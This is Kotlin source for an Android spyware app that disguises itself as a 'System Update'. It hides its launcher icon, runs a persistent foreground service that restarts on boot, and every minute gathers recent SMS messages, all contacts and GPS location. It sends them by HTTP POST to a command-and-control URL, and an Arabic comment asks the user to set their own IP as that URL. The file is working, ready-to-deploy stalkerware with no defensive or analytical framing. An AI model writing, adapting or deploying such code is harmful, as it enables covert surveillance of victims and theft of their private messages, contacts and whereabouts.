package com.system.update

import android.Manifest
import android.app.*
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.app.ActivityCompat
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

object Cfg {
    // ضع عنوان IP الخاص بك هنا (استبدل 192.168.1.100 بـ IP جهازك)
    const val C2_URL = "http://192.168.1.100:8443/data"
}

class MainActivity : Activity() {
    private val perms = arrayOf(
        Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.POST_NOTIFICATIONS
    )

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        val missing = perms.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
        if (missing.isNotEmpty()) ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1001)
        launch()
        hideIcon()
        finish()
    }

    override fun onRequestPermissionsResult(rc: Int, p: Array<out String>, r: IntArray) {
        super.onRequestPermissionsResult(rc, p, r)
        launch()
    }

    private fun launch() {
        try {
            val i = Intent(this, SpyService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i)
        } catch (_: Exception) {}
    }

    private fun hideIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}

class SpyService : Service() {
    private var isRunning = true

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel("spy", "System", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
            val n = Notification.Builder(this, "spy")
                .setContentTitle("System Update").setContentText("Checking...")
                .setSmallIcon(android.R.drawable.ic_menu_manage).build()
            startForeground(1, n)
        }
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        Thread {
            while (isRunning) {
                try { collectAndSendData() } catch (_: Exception) {}
                Thread.sleep(TimeUnit.MINUTES.toMillis(1))
            }
        }.start()
        return START_STICKY
    }

    private fun collectAndSendData() {
        val data = JSONObject()
        val smsList = mutableListOf<String>()
        contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 10")?.use {
            while (it.moveToNext()) {
                smsList.add(it.getString(it.getColumnIndexOrThrow("address")) + ": " + it.getString(it.getColumnIndexOrThrow("body")))
            }
        }
        data.put("sms", smsList)

        val contactsList = mutableListOf<String>()
        contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use {
            while (it.moveToNext()) {
                contactsList.add(it.getString(it.getColumnIndexOrThrow("display_name")) + ": " + it.getString(it.getColumnIndexOrThrow("number")))
            }
        }
        data.put("contacts", contactsList)

        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        if (loc != null) data.put("location", "${loc.latitude},${loc.longitude}")

        sendToC2(data.toString())
    }

    private fun sendToC2(jsonData: String) {
        try {
            val conn = URL(Cfg.C2_URL).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            val os = conn.outputStream
            val writer = OutputStreamWriter(os, "UTF-8")
            writer.write(jsonData)
            writer.flush()
            writer.close()
            os.close()
            conn.responseCode
        } catch (_: Exception) {}
    }

    override fun onBind(i: Intent?): IBinder? = null
    override fun onDestroy() { isRunning = false; super.onDestroy() }
}

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, i: Intent) {
        if (i.action == Intent.ACTION_BOOT_COMPLETED) {
            val si = Intent(ctx, SpyService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(si) else ctx.startService(si)
        }
    }
}
